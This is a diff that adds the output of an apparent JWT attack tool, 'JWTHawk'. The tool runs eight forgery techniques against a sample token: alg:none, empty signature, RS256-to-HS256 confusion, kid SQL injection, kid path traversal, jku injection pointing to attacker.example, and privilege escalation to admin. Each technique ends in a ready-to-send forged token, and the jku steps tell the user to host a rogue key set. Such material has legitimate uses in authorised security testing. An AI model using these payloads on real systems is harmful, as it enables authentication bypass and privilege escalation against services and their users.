@@ -1,0 +1,183 @@
+# python3 jwthawk.py --token <RS256 sample> --jku-url https://attacker.example/.well-known/jwks.json
+
+JWTHawk  164-byte token, RS256 baseline
+  baseline header  {"alg": "RS256", "typ": "JWT"}
+  baseline payload {"sub": "bob", "role": "user", "plan": "free", "exp": 1900000000}
+  signature        36 bytes (66616B652D727361...)
+······································································
+
+attack: alg:none
+why:    server treats `none` as a valid algorithm and skips signature verification
+
+--- header (original)
++++ header (mutated)
+- alg: "RS256"
++ alg: "none"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: signature stripped to empty string
+
+  token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.
+······································································
+
+attack: empty signature
+why:    some libraries accept an empty `b64()` signature when `alg` is unchanged
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: alg untouched, signature emptied
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.
+······································································
+
+attack: alg confusion (RS256 → HS256)
+why:    server uses the RSA public key as an HMAC secret when alg is downgraded to HS256
+
+--- header (original)
++++ header (mutated)
+- alg: "RS256"
++ alg: "HS256"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: WARN: --pubkey not supplied; signed with empty key as a placeholder
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.NLUwUcMCbMewpu2xX0xHhZj0HCa8DIlhpAfh2-Em6rY
+······································································
+
+attack: kid SQL injection
+why:    server resolves `kid` via SQL: UNION returns an attacker-controlled key the token is then signed with
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
++ kid: "x' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='-- "
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: kid is a UNION SELECT returning the constant 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='
+  note: token signed with that constant via HS256
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IngnIFVOSU9OIFNFTEVDVCAnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBPSctLSAifQ.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.37kSZGtsfR2_pR_V1JBSk1NzoISANguHpRwnwm8Spko
+······································································
+
+attack: kid path traversal
+why:    server reads the key file from disk via `kid`; pointing at /dev/null yields an empty key
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
++ kid: "../../../../../../dev/null"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: kid points at /dev/null; HMAC signed with empty key
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.0aSWbj12Mq2C_azZRqr5KuQHf9x36mHdNFIbDOZMvEo
+······································································
+
+attack: jku injection
+why:    server fetches the JWKS from the URL in `jku` — point it at an attacker host serving the matching public key
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
++ jku: "https://attacker.example/.well-known/jwks.json"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: jku set to https://attacker.example/.well-known/jwks.json
+  note: host an RSA JWKS at that URL; sign the token with your matching private key (openssl genrsa)
+  note: signature placeholder above is intentional — replace before sending
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjoxOTAwMDAwMDAwfQ.PHNpZ24td2l0aC15b3VyLXByaXZhdGUta2V5Pg
+······································································
+
+attack: role escalation (payload mutation)
+why:    payload-only mutation that pairs with any signature-bypass attack above
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
++ is_admin: true
++ is_staff: true
+  plan: "free"
+- role: "user"
++ role: "admin"
++ scope: "admin"
+  sub: "bob"
+
+  note: set role=admin (was 'user')
+  note: added is_admin=True
+  note: added is_staff=True
+  note: added scope=admin
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoiYWRtaW4iLCJwbGFuIjoiZnJlZSIsImV4cCI6MTkwMDAwMDAwMCwiaXNfYWRtaW4iOnRydWUsImlzX3N0YWZmIjp0cnVlLCJzY29wZSI6ImFkbWluIn0.ZmFrZS1yc2Etc2lnbmF0dXJlLWJ5dGVzLTMyLWxvbmctcGFk
+······································································
+
+attack: exp extension
+why:    extends token validity past sane bounds; pairs with sig-bypass attacks
+
+--- header (original)
++++ header (mutated)
+  alg: "RS256"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+- exp: 1900000000
++ exp: 9999999999
+  plan: "free"
+  role: "user"
+  sub: "bob"
+
+  note: exp set to 9999999999 (was 1900000000)
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsInBsYW4iOiJmcmVlIiwiZXhwIjo5OTk5OTk5OTk5fQ.ZmFrZS1yc2Etc2lnbmF0dXJlLWJ5dGVzLTMyLWxvbmctcGFk
+······································································
